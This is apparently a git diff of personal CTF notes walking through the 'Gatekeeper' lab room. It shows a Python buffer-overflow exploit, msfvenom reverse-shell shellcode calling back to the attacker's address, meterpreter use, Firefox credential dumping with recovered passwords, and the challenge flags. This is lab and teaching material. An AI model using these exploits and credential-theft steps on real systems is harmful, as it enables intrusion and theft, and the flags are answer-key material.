@@ -8,13 +8,11 @@ Can you get past the gate and through the fire?
 
 Deploy the machine when you are ready to release the Gatekeeper.
 
-
 **Writeups will not be accepted for this challenge**
 
 ### Defeat the Gatekeeper and pass through the fire. 
 
 Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.
-
 
 ```
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
@@ -172,9 +170,7 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.230.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 
-
 When accessing the share using SMBClient, it appears to contain a gatekeeper.exe file, downloading it locally:
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
 └─$ smbclient \\\\10.10.230.169\\Users
@@ -198,7 +194,6 @@ smb: \share\> dir
 smb: \share\> get gatekeeper.exe
 getting file \share\gatekeeper.exe of size 13312 as gatekeeper.exe (12.1 KiloBytes/sec) (average 12.1 KiloBytes/sec)
 smb: \share\> exit
-
 
 Exploiting Buffer Overflow
 
@@ -246,7 +241,6 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 Sending the 300 bytes of data to the service on port 31337:
 
-
                                                                                                                  
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
 └─$ nc 10.10.230.169 31337
@@ -261,7 +255,6 @@ The next step required is to identify which part of the buffer that is being sen
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
 └─$ msf-pattern_create -l 300                                                                  
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
 └─$ cat exploit.py              
@@ -290,11 +283,9 @@ try:
 except:
   print("Could not connect.")
 
-
 then run the exploit script and go to immunity debugger you will see the program has been crashed
 
 then copy the EIP address and go to terminal again to calculate the offset
-
 
 EIP to get the offset for exploit.py
 
@@ -318,7 +309,6 @@ and confirm the overwrite by change the padding variable to BBBB and delete any 
 restart the program in immunity by pressing ctrl + f2 and f9 twice
 
 and run the exploit script again
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
 └─$ cat exploit.py
@@ -347,7 +337,6 @@ try:
 except:
   print("Could not connect.")
 
-
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
 └─$ cat exploit.py
 import socket
@@ -375,7 +364,6 @@ try:
 except:
   print("Could not connect.")
 
-
 in normal you will see in EIP register the value is 41414141 this for we send A but now you will see the EIP value is 42424242 because we added the BBBB over the offset
 
 the next step get the bad character (this character make problems during the payload running to lead attack failed to get reverse shell)
@@ -383,7 +371,6 @@ the next step get the bad character (this character make problems during the pay
 i will use mona module then make working dir to mona by this command
 
 !mona config -set workingfolder c:\mona\%p
-
 
 !mona findmsp -distance 300
 
@@ -435,9 +422,6 @@ try:
 except:
   print("Could not connect.")
 
-
-
-
 now restart the program in immunity by pressing ctrl + f2 and f9 twice
 
 then run the exploit script
@@ -447,7 +431,6 @@ the program it will crash again ok now i will get the bad chars by tow methods
 the first method by go to ESP register and right click and choose follow in dump
 
 !mona compare -f C:\mona\oscp\bytearray.bin -a 016A19F8
-
 
 you will get the bad chars is \x00 and \x0a
 
@@ -466,7 +449,6 @@ and added in retn variable in exploit script
 ok now generate the payload to gain the reverse shell
 
 i will use msfvenom
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4444 -b "\x00\xa" -f c
@@ -508,7 +490,6 @@ unsigned char buf[] =
 "\xe0\xf8\xca\xb5\x98\xd5\xc2\x42\xca\x73\x52\x08\xbd\x9e"
 "\xca\x1b\x8a\x75\x3f\x42\xca\xf4\xa4\xc1\x15\x48\x59\x5d"
 "\x6a\xcd\x19\xfa\x0c\xba\xcd\xd7\x1f\x9b\x5d\x68";
-
 
 last exploit.py
 
@@ -568,8 +549,6 @@ except:
 Sending evil buffer...
 Done!
 
-
-
 ┌──(kali㉿kali)-[~]
 └─$ nc -nvlp 4444              
 Ncat: Version 7.92 ( https://nmap.org/ncat )
@@ -584,14 +563,12 @@ C:\Users\natbat\Desktop>whoami
 whoami
 gatekeeper\natbat
 
-
 C:\Users\natbat\Desktop>more user.txt.txt
 more user.txt.txt
 {H4lf_W4y_Th3r3}
 
 The buffer overflow in this room is credited to Justin Steven and his 
 "dostackbufferoverflowgood" program.  Thank you!
-
 
 now using metasploit so generate a meterpreter with msfconsole and replace or create a new one exploit.py
 
@@ -656,7 +633,6 @@ payload += b"\x70\xf2\x9e\x9b\x87\xf3\x5e\xb2\xe3\xf4\x5e"
 payload += b"\xba\x15\xc9\x88\x83\x63\x0c\x09\xb0\x7c\x3b"
 payload += b"\x2c\x91\x16\x43\x62\xe1\x32"
 
-
 remember the padding just to ge no errors
 
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
@@ -720,7 +696,6 @@ try:
   print("Done!")
 except:
   print("Could not connect.")
-
 
 ----
 
@@ -892,7 +867,6 @@ try:
 except:
   print("Could not connect.")
 
-
 yep was prolly a problem with the port 1337 so I change port 4444
 
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
@@ -917,7 +891,6 @@ Module options (exploit/multi/handler):
    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
 
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -928,13 +901,11 @@ Payload options (windows/meterpreter/reverse_tcp):
                                         may be specified)
    LPORT     1337             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Wildcard Target
-
 
 msf6 exploit(multi/handler) > set lport 4444
 lport => 4444
@@ -975,7 +946,6 @@ meterpreter > cat user.txt.txt
 The buffer overflow in this room is credited to Justin Steven and his 
 "dostackbufferoverflowgood" program.  Thank you!meterpreter > 
 
-
 now the party will be start now privilege escalation time
 
 when i run ls command in back screen i found Firefox.lnk
@@ -989,7 +959,6 @@ ok now press ctrl+z in meterpreter shell and choose yes kept it in background
 and now use the post/multi/gather/firefox_creds to dump the users credential
 
 use post/multi/gather/firefox_creds
-
 
 meterpreter > 
 Background session 1? [y/N]  y
@@ -1045,7 +1014,6 @@ we should change the filse name to cert9.db,cookies.sqlite,login.json and key4.d
 
 ok now i will rename all files
 
-
 ┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
 └─$ ls
 badchar.py  exploit_msf.py  exploit.py  gatekeeper.exe
@@ -1076,7 +1044,6 @@ badchar.py  exploit_msf.py  exploit.py  gatekeeper.exe
                                                                            
 ┌──(kali㉿kali)-[~/.msf4/loot]
 └─$ mv 20220930143457_default_10.10.118.64_ff.ljfn812a.logi_051444.bin logins.json
-
 
 ┌──(kali㉿kali)-[~/.msf4/loot]
 └─$ git clone https://github.com/unode/firefox_decrypt.git
@@ -1132,12 +1099,9 @@ firefox_decrypt.py
 key4.db
 logins.json
 
-
-
 now i will run the tool by this command
 
 python3 firefox_decrypt.py ./
-
 
 ┌──(kali㉿kali)-[~/.msf4/loot]
 └─$ python3 firefox_decrypt.py ./                                  
@@ -1147,7 +1111,6 @@ python3 firefox_decrypt.py ./
 Website:   https://creds.com
 Username: 'mayor'
 Password: '8CL7O1N78MdrCIsV'
-
 
 now use a remote desktop
 
@@ -1170,39 +1133,12 @@ so the machine is pwned
 
 ```
 
-![[Pasted image 20220929231225.png]]
-
-![[Pasted image 20220930102627.png]]
-
-![[Pasted image 20220930102814.png]]
-
-![[Pasted image 20220930103225.png]]
-
-![[Pasted image 20220930104400.png]]
-
-![[Pasted image 20220930104526.png]]
-
-![[Pasted image 20220930111419.png]]
-
-![[Pasted image 20220930113931.png]]
-
-![[Pasted image 20220930122810.png]]
-
 ![](https://miro.medium.com/max/720/1*F7wXSDRZKJkrJPu7jzc_sA.png)
-
-![[Pasted image 20220930134720.png]]
-
 
 Locate and find the User Flag.
 *{H4lf_W4y_Th3r3}*
 
-
-
 Locate and find the Root Flag
 *{Th3_M4y0r_C0ngr4tul4t3s_U}*
 
-
-
-
-
-[[Brainstorm]]
+[[Brainstorm]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
